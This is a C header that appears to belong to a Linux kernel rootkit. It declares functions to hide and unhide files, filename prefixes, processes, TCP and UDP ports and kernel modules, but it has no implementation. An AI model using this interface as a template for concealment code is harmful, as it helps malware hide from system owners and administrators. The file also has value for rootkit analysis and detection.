#ifndef CONTROL_HEADER
#define CONTROL_HEADER

#include <linux/list.h>

#include "include.h"

/*
 * Functions for adding and removing certain objects from hiding
 */

int
is_path_hidden(char *name);

int
hide_file_name(char *name);

int
unhide_file_name(char *name);

int
is_prefix_hidden(char *name);

int
hide_file_prefix(char *name);

int
unhide_file_prefix(char *name);

int
is_process_hidden(pid_t pid);

int
hide_process(pid_t pid);

int
unhide_process(pid_t pid);

int
is_tcp_socket_hidden(int port);

int
hide_tcp_socket(int port);

int
unhide_tcp_socket(int port);

int
is_udp_socket_hidden(int port);

int
hide_udp_socket(int port);

int
unhide_udp_socket(int port);

int
is_module_hidden(char *name);

int
hide_module(char *name);

int
unhide_module(char *name);

void
initialize_control(void);

void
cleanup_control(void);

#endif

